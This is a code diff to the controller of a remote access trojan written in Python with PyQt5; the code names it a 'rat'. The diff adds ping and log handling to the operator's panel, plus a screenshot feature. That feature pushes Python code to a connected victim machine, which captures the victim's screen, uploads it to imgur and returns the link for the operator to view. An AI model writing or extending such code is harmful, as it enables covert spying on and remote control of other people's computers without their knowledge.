@@ -1,6 +1,8 @@
 # Imports
 import sys
-from PyQt5 import QtWidgets, QtCore
+
+import requests
+from PyQt5 import QtWidgets, QtCore, QtGui
 from data.settings import Settings
 import pusher
 import pusher.errors
@@ -107,6 +109,52 @@ def handle_menu_click(text: str) -> None:
     index[text][0](index[text][1])
 
 
+def handle_ping(data) -> None:
+    """
+    Handles the ping from the client
+    :param data:
+    :return:
+    """
+    if data == "pong":
+        popup("Ping", "Connection to client is alive")
+
+
+def on_logs(data):
+    ui.logsPytoon.append(data)
+    ui.logsConsole.append(data)
+    ui.downloadLogs.append(data)
+    ui.wallpaperLogs.append(data)
+
+
+def clear_logs():
+    ui.logsPytoon.clear()
+    ui.logsConsole.clear()
+    ui.downloadLogs.clear()
+    ui.wallpaperLogs.clear()
+
+
+def take_screenshot() -> None:
+    """
+    Takes and renders screenshot
+    :return:
+    """
+    if client_id == str():
+        popup("Error", "Connect to a client first")
+        return
+    client.trigger('admin-' + str(client_id), 'python', f"""
+imgur_image = daun.screenshot.upload_to_imgur("{Settings.get_settings().get('client_id')}")
+client.trigger('client-{client_id}', 'screenshot', imgur_image)
+client.trigger('client-{client_id}', 'logs', "Received screenshot: " + imgur_image)
+""")
+
+
+def on_screenshot(data):
+    print("on screenshot")
+    image = QtGui.QImage()
+    image.loadFromData(requests.get(data).content)
+    ui.screenshotLabel.setPixmap(QtGui.QPixmap(image))
+
+
 def connect_to_rat() -> None:
     """
     Connects to rat based on selected id
@@ -117,6 +165,10 @@ def connect_to_rat() -> None:
         client_id = ui.availableDevices.currentItem().text()
         client.trigger('admin-' + str(client_id), 'connection_from_admin', None)
         print("Sent connection message to client")
+        channel = receiver.subscribe('client-' + client_id)
+        channel.bind('ping', handle_ping)
+        channel.bind('logs', on_logs)
+        channel.bind('screenshot', on_screenshot)
     except Exception as e:
         print(e)
 
@@ -159,6 +211,11 @@ ui.leftMenu.itemClicked.connect(lambda: handle_menu_click(ui.leftMenu.currentIte
 ui.saveSettingsButton.clicked.connect(lambda: (globals().update(settings=update_settings(ui))))
 ui.reconRefreshButton.clicked.connect(lambda: reconnect_to_pusher())
 ui.connectButton.clicked.connect(lambda: connect_to_rat())
+ui.pingButton.clicked.connect(lambda: client.trigger('admin-' + client_id, 'ping', 'ping'))
+ui.clearPythonLogs.clicked.connect(lambda: clear_logs())
+ui.clearConsoleLogs.clicked.connect(lambda: clear_logs())
+ui.clearDlLogsButton.clicked.connect(lambda: clear_logs())
+ui.takeScreenshotButton.clicked.connect(lambda: take_screenshot())
 
 # Handling closing of the window to exit whole program
 sys.exit(app.exec_())
